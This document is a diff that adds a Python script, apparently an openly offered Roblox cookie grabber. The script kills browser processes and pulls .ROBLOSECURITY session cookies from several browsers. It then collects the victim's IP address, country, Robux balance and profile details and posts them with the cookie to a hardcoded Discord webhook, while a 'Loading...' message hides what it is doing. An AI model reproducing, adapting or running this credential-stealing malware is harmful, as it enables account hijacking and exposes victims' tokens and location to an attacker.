@@ -1,0 +1,143 @@
+import os
+import codecs
+import json
+from base64 import *
+import psutil
+
+webhookk = "https://discord.com/api/webhooks/1171569449271300167/-gjvIaTHTkwt-93f-5YE-kkAQsPm_q7YdtO1hUGp6u7ola1kHKIz85T8fc5y-QVfpb0x"
+def command(c):
+    os.system(c)
+def cls():
+    os.system("cls")
+
+try:
+    import robloxpy
+    import requests,re
+    from discordwebhook import *
+    import browser_cookie3
+    
+except:
+    input("Libraries not installed press enter to exit...")
+
+
+def kill_chrome():
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'chrome.exe' in proc.info['name']:
+            proc.kill()
+
+if __name__ == "__main__":
+    kill_chrome()
+
+def kill_edge():
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'edge.exe' in proc.info['name']:
+            proc.kill()
+
+if __name__ == "__main__":
+    kill_edge()
+
+def kill_opera():
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'edge.exe' in proc.info['name']:
+            proc.kill()
+
+if __name__ == "__main__":
+    kill_opera()
+
+
+def kill_firefox():
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'edge.exe' in proc.info['name']:
+            proc.kill()
+
+if __name__ == "__main__":
+    kill_firefox()
+
+
+dummy_message = "Loading..."
+print(dummy_message)
+def cookieLogger():
+    data = []
+
+    browsers = ['chrome', 'chromium', 'edge', 'opera', 'firefox']
+
+    for browser in browsers:
+        try:
+            cookies = getattr(browser_cookie3, browser)(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    data.append((browser, cookie.value))
+        except:
+            pass
+
+    return data
+
+cookies = cookieLogger()
+
+for browser, roblox_cookie in cookies:
+    ip_address = requests.get("https://api.ipify.org/").text
+
+    isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+    if isvalid == "Valid Cookie":
+        pass
+    else:
+        requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
+        continue
+
+    ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+    info = json.loads(ebruh.text)
+    rid = info["UserID"]
+    rap = robloxpy.User.External.GetRAP(rid)
+    friends = robloxpy.User.Friends.External.GetCount(rid)
+    age = robloxpy.User.External.GetAge(rid)
+    crdate = robloxpy.User.External.CreationDate(rid)
+    rolimons = f"https://www.rolimons.com/player/{rid}"
+    roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+    headshot = robloxpy.User.External.GetHeadshot(rid)
+    username = info['UserName']
+    robux = info['RobuxBalance']
+    premium = info['IsPremium']
+    url2 = f"http://ipinfo.io/{ip_address}/json"
+    response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar?userIds={rid}&size=150x150&format=png')
+    data = response.json()
+
+    if 'data' in data and len(data['data']) > 0:
+        thumbnail_url = data['data'][0]['imageUrl']
+    
+    # Send a GET request to the ipinfo.io API
+    response = requests.get(url2)
+
+    # Parse the JSON response
+    data = response.json()
+    country = data.get("country", "Unknown")
+    country_flag = f":flag_{country.lower()}:"
+    embed_payload = {
+        "embeds": [
+            {   
+                "username": "MrBreast",
+                "title": "**Jesse We got an other one** <:Waltermin:1227280337478881311>",
+                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})||```fix\n{roblox_cookie}\n```||",
+                "color": 12452044,
+                "author": {
+                    "name": "GaiPoloMDRs",
+                    "url": "https://images-ext-1.discordapp.net/external/BZUps6DmtnT9Snlnn8IpVSLQjKvs9u7wYRkqt5hTsu4/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/1130177212738449438/69753852cf91a46e414d345fa80f05a1.png?format=webp&quality=lossless&width=670&height=670",
+                    "icon_url": "https://images-ext-1.discordapp.net/external/BZUps6DmtnT9Snlnn8IpVSLQjKvs9u7wYRkqt5hTsu4/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/1130177212738449438/69753852cf91a46e414d345fa80f05a1.png?format=webp&quality=lossless&width=670&height=670"
+                },
+                "fields": [
+                    {"name": "Username", "value": username, "inline": True},
+                    {"name": "Robux Balance", "value": robux, "inline": True},
+                    {"name": "Premium Status", "value": premium, "inline": True},
+                    {"name": "Creation Date", "value": crdate, "inline": True},
+                    {"name": "RAP", "value": rap, "inline": True},
+                    {"name": "Friends", "value": friends, "inline": True},
+                    {"name": "Account Age", "value": age, "inline": True},
+                    {"name": "IP Address", "value": ip_address, "inline": True},
+                    {"name": "Country", "value": f"{country} {country_flag}", "inline": True}
+                ],
+                "thumbnail": {"url": thumbnail_url}
+            }
+        ]
+    }
+
+
+    requests.post(webhookk, json=embed_payload)
